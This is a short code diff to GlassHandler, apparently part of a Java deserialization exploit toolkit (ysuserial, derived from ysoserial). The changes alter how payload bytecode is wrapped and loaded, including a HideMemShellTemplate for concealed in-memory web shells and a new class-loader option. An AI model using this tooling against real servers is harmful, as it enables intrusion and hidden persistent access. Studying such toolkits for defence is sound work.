@@ -85,7 +85,7 @@ public class GlassHandler {
 			shrinkBytes(ctClass);
 
 			// 使用 ClassLoaderTemplate 进行加载
-			return encapsulationByClassLoaderTemplate(ctClass.toBytecode());
+			return encapsulationByClassLoaderTemplate(ctClass.toBytecode(), false);
 		}
 
 		return null;
@@ -128,7 +128,7 @@ public class GlassHandler {
 				case 1:
 					break;
 				case 2:
-					CtClass newClass = POOL.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
+					CtClass newClass = POOL.get("org.su18.ysuserial.payloads.templates.classloader.HideMemShellTemplate");
 					newClass.setName(generateClassName());
 					String content = "b64=\"" + Base64.encodeBase64String(byteCodes) + "\";";
 					String cName = "className=\"" + ctClass.getName() + "\";";
@@ -137,6 +137,9 @@ public class GlassHandler {
 					newClass.makeClassInitializer().insertBefore(cName);
 
 					ctClass = newClass;
+					break;
+				case 3:
+					ctClass = encapsulationByClassLoaderTemplate(byteCodes, true);
 					break;
 			}
 		}
